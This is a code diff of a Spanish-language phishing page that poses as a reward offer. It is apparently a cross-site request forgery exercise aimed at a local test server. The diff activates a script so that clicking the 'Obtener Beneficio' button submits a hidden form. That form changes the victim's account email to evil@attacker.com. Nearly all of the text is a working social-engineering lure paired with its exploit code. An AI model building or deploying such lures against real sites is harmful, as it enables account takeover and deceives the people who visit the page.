@@ -23,7 +23,7 @@
             Para activar tu recompensa, validá tu cuenta presionando el botón de abajo.
         </p>
 
-        <a href="http://127.0.0.1:5000/login#" class="btn">Obtener Beneficio</a>
+        <a href="#" class="btn" id="btn-premio">Obtener Beneficio</a>
 
         <p class="legal">
             Promoción válida solo una vez por usuario.  
@@ -35,14 +35,17 @@
         <input name="new_email" value="evil@attacker.com">
     </form>
 
-    <!--   <script>
+    <script>
         document.addEventListener('DOMContentLoaded', function() {
-        var form = document.getElementById('f');
-        if (form) {
-            setTimeout(function(){ form.submit(); }, 200);
-        }
+            var btn = document.getElementById('btn-premio');
+            var form = document.getElementById('f');
+
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();         
+                form.submit();              
+            });
         });
-    </script> -->
+    </script>
 
 </body>
 </html>
